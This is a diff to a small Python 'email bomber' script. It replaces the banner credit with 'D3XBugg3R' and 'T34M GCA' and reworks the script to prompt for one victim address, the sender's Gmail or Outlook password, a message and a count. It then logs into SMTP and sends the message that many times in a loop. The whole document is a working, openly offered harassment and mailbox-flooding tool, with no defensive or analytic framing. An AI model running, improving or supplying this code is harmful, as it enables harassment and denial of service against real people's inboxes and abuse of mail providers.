@@ -1,33 +1,35 @@
 import smtplib
 import time
 print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
-print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By @everydaycodings                  \033[1;m")
-print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|              Made with code             \033[1;m")
+print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By D3XBugg3R                  \033[1;m")
+print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|            With <3 of T34M GCA             \033[1;m")
 print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
 print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
 print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")
 
-files = open('email.txt', 'r')
-bomb_emails = files.readlines()
+try:
+    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
+    email = input("Enter your gmail_address:")
+    password = input("Enter your gmail_password:")
+    message = input("Enter Message:")
+    counter = int(input("How many message you want to send?:"))
 
+    # gmail of outlook
+    s_ = input('Select the service provider (Gmail / Outlook): ').lower()
 
-email = input("Enter your gmail_address:")
-password = input("Enter your gmail_password:")
-message = input("Enter Message:")
-message_relode = int(input("How many message you want to send?:"))
-
-
-for bomb_email in bomb_emails:
-    for x in range(0, message_relode):
+    if s_ == "gmail":
         mail = smtplib.SMTP('smtp.gmail.com',587)
+    elif s_ == "outlook":
+        mail = smtplib.SMTP('smtp.office365.com',587)
+
+    for x in range(0,counter):
+        print("Number of Message Sent : ", x+1)
         mail.ehlo()
         mail.starttls()
         mail.login(email,password)
         mail.sendmail(email,bomb_email,message)
-        print("message sent to {}".format(bomb_email))
-    time.sleep(1)
+        time.sleep(1)
 
-mail.close()
-files.close()
-
-print("Done")
+    mail.close()
+except Exception as e:
+    print("Something is wrong, please Re-try Again with Valid input.")
